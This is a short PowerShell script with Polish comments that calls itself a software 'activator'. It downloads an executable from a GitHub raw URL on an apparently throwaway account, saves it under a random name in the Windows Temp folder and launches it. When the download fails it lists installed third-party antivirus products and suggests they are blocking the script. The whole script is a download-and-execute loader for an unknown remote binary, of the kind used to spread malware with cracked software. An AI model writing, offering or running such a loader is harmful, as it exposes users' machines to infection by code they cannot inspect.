[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$URLs = @(
    'https://github.com/testmina77/testmina77.github.io/raw/refs/heads/main/barkowiec_LEGENDA.exe'
)

foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try { $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
}
if (-not $cmdContent) {
    Check3rdAV
    Write-Host "Failed to download activator from repositories! Quitting..."
    return
}

# Funkcja do sprawdzania zainstalowanych antywirusów
function Check3rdAV {
    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
    if ($avList) {
        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
    }
}

# Funkcja do sprawdzania istnienia pliku
function CheckFile { 
    param ([string]$FilePath) 
    if (-not (Test-Path $FilePath)) { 
        Check3rdAV
        Write-Host "Failed to create file in temp folder, aborting!"
        throw 
    } 
}

# Tworzenie tymczasowego pliku .cmd
$rand = [Guid]::NewGuid().Guid
$FilePath = "$env:SystemRoot\Temp\$rand.exe"
Set-Content -Path $FilePath -Value $cmdContent

# Sprawdzanie, czy plik został zapisany poprawnie
CheckFile $FilePath

# Uruchomienie pliku .cmd w tym samym oknie PowerShell (bez otwierania nowego okna)
$process = Start-Process -FilePath "$FilePath"
# -PassThru -Wait -NoNewWindow
exit
